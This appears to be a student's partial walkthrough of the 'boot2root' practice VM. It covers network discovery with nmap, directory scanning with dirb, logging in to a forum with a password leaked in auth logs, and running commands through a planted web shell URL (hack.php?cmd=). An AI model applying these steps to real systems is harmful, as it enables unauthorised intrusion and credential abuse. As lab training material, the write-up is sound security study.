1. in virtual box go to the setting of machine we use for boot2root project, go to network section, use the adapter "Host-only Adapter",
    use the default name "vboxnet0".
2. so now we can use ifconfig to have more infos on our ips
    with command ifconfig, we have:
    vboxnet0: flags=8943<UP,BROADCAST,RUNNING,PROMISC,SIMPLEX,MULTICAST> mtu 1500
	ether 0a:00:27:00:00:00
	inet 192.168.99.1 netmask 0xffffff00 broadcast 192.168.99.255
    we know all the vm with adapter vboxnet0, their ips are between 192.168.99.0-255
3. brew install nmap
   use nmap to scan all the ips in that range:
   nmap  192.168.99.0-255
   we have:
   Nmap scan report for 192.168.99.100
   Host is up (0.10s latency).
   Not shown: 994 closed tcp ports (conn-refused)
   PORT    STATE SERVICE
   21/tcp  open  ftp
   22/tcp  open  ssh
   80/tcp  open  http
   143/tcp open  imap
   443/tcp open  https
   993/tcp open  imaps
   so that we know the ip of the machine is 192.168.99.100
4. use another tool called dirp to scan (DIRB is a Web Content Scanner. It looks for existing (and/or hidden) Web Objects.)
   use following steps to have dirp in our host machine:
   cd ~/Applications
   wget https://downloads.sourceforge.net/project/dirb/dirb/2.22/dirb222.tar.gz
   tar -xvf dirb222.tar.gz
   rm dirb222.tar.gz
   brew install autoconf
   chmod -R 755 dirb222
   cd dirb222
   ./configure
   make
   make install
   add the path to the binary:
   export PATH=$PATH:{binary path}

   ```shell
   lists/common.txt

   -----------------
   DIRB v2.22
   By The Dark Raver
   -----------------

   START_TIME: Mon Oct 25 20:20:54 2021
   URL_BASE: http://192.168.56.101/
   WORDLIST_FILES: wordlists/common.txt

   -----------------

   GENERATED WORDS: 4612

   ---- Scanning URL: https://192.168.56.101/ ----
   + https://192.168.56.101/cgi-bin/ (CODE:403|SIZE:291)
   ==> DIRECTORY: https://192.168.56.101/forum/
   ==> DIRECTORY: https://192.168.56.101/phpmyadmin/
   + https://192.168.56.101/server-status (CODE:403|SIZE:296)
   ==> DIRECTORY: https://192.168.56.101/webmail/
   ```
      the result shows that there are directories on the server named forum phpmyadmin and webmail
   so let's try https://192.168.56.101/forum
   when we click on the left side "problem login?", we are directed to another page who has lots logs of user lmezard
   and there is something interesting:
   Oct 5 08:45:29 BornToSecHackMe sshd[7547]: Failed password for invalid user !q\]Ej?*5K5cy*AJ from 161.202.39.38 port 57764 ssh2
   Oct 5 08:45:29 BornToSecHackMe sshd[7547]: Received disconnect from 161.202.39.38: 3: com.jcraft.jsch.JSchException: Auth fail [preauth]
   Oct 5 08:46:01 BornToSecHackMe CRON[7549]: pam_unix(cron:session): session opened for user lmezard by (uid=1040)
   ok, we have the user name, and "!q\]Ej?*5K5cy*AJ" looks like a password, maybe have a try?
   click in login, and username lmezard and !q\]Ej?*5K5cy*AJ for password ------ wtf, we logged in !
   now click onnthe right side on his name, we are in the edit profile page , and we have :
   E-mail:	laurie@borntosec.net
   we got his email address

https://192.168.99.100/forum/templates_c/hack.php?cmd=ls%20/
    file fun to see what is this file
    fun: POSIX tar archive (GNU)

 tar xvf fun

